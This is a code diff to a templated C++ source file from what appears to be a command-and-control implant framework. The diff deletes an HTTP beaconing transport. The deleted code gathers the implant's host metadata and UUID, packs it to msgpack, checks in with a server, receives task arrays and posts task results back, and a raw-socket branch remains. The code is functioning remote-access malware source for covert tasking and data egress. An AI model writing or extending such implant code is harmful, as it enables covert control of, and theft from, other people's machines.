@@ -74,7 +74,7 @@ protected:
 };
 
 // ==========================================================
-// 2. HTTP IMPLEMENTATIONS (Amazon Profile)
+// 2. POLL-BASED TRANSPORT IMPLEMENTATIONS
 // ==========================================================
 
 // Forward declarations of GET functions from comms.cpp
@@ -93,115 +93,7 @@ namespace [[ profile.ns ]] {
 
 //Declare classes for each comms type
 
-//this wil need to get moved to its own per whatever impl...
-
-//if http....
-[% if profile.type == 'http' %]
-// GET for [[ profile_name ]]
-/*
-========================================================================
-HTTP / POLL-BASED EGRESS (Standard Beaconing)
-========================================================================
-If the active strategy is a standard network protocol (like HTTP),
-initialization is completely stateless and straightforward.
-
-Unlike Named Pipes/handle based methods, we do not need to manage persistent OS handles,
-worry about dead P2P links, or block waiting for a connection.
-
-We simply instantiate the transport class. The actual socket creation,
-HTTP transaction, and teardown will happen entirely on-the-fly inside
-the class whenever current_egress_->send_response() is called.
-========================================================================
-*/
-
-class [[ profile.ns ]]_Ingress : public IIngressTransport {
-public:
-    //return NULL on non pipe/handle returning transport methods.
-    //parent loop handles this by reverting to a wait for single, which waits
-    //for the worker.
-    HANDLE get_wait_handle() override {
-        return NULL;
-    }
-    bool initialize() override {
-        // HTTP is stateless, so initialization always succeeds
-        return true;
-    }
-
-    nlohmann::json create_get_request(const std::string& uuid, bool full_metadata = false) override {
-        /*
-        Creates the get task for THIS implant. 
-        
-        */
-
-        //Note - moved logic of msgpack/metadata to this, instead of inside of each transport
-        //method. This keeps everythign cleaner/less tied together
-        nlohmann::json metadata = nlohmann::json();
-        std::vector<uint8_t> metadata_as_msgpack;
-
-        //if we want to include full metdata
-        if (full_metadata) {
-            metadata = populate_metadata();
-        }
-        //add implant uuid to data
-        metadata["implant_uuid"] = uuid;
-        return metadata;
-
-    }
-    nlohmann::json get(std::string implant_uuid) {
-        /*
-        Gathers all queued GET requests, and yeets them off to the server in an
-        array.
-
-        Then, we get the task array back, and return them.
-        
-        */
-        //get all items in queue for sending back to server
-        nlohmann::json get_array = GetQueue::drain_queue();
-
-        //check if we are registered. if not, include metadata
-        bool populate_this_implants_metadata = true; //temp enable, settings ebing dumb
-        //if (SettingsManager::instance().get<int>("registered", 1) != 1) {
-        //    bool populate_this_implants_metadata = true;
-        //}
-
-        //add our own checkin here
-        nlohmann::json this_implants_get = this->create_get_request(implant_uuid, populate_this_implants_metadata);
-        get_array.push_back(this_implants_get);
-
-        DEBUG_LOG("CHECKIN DATA -> SERVER");
-        DEBUG_LOG(get_array.dump(4));
-
-        //to msgpack
-        std::vector<uint8_t> get_as_msgpack;
-        get_as_msgpack = this->pack_to_msgpack(get_array);
-
-        //send checkin
-        std::vector<uint8_t> response = [[ profile.ns ]]::get(get_as_msgpack);
-
-        nlohmann::json task_array = nlohmann::json::array();
-        if (!response.empty()) {
-            //unpack response, add to array
-            //note, don't push back, this comes in as [{},{}...]
-            task_array = this->unpack_to_json(response);
-        }
-
-        return task_array;
-    }
-
-};
-
-// POST for [[ profile_name ]]
-class [[ profile.ns ]]_Egress : public IEgressTransport {
-public:
-    void send_response(const std::string& uuid, const nlohmann::json& task_response_array) override {
-        std::vector<uint8_t> task_response_msgpack_list = this->pack_to_msgpack(task_response_array);
-
-        [[ profile.ns ]]::post(uuid, task_response_msgpack_list);
-    }
-};
-
-//if raw....
-[% elif profile.type == 'raw' %]
+[% if profile.type == 'raw' %]
 /*
 ========================================================================
 RAW SOCKET / POLL-BASED EGRESS
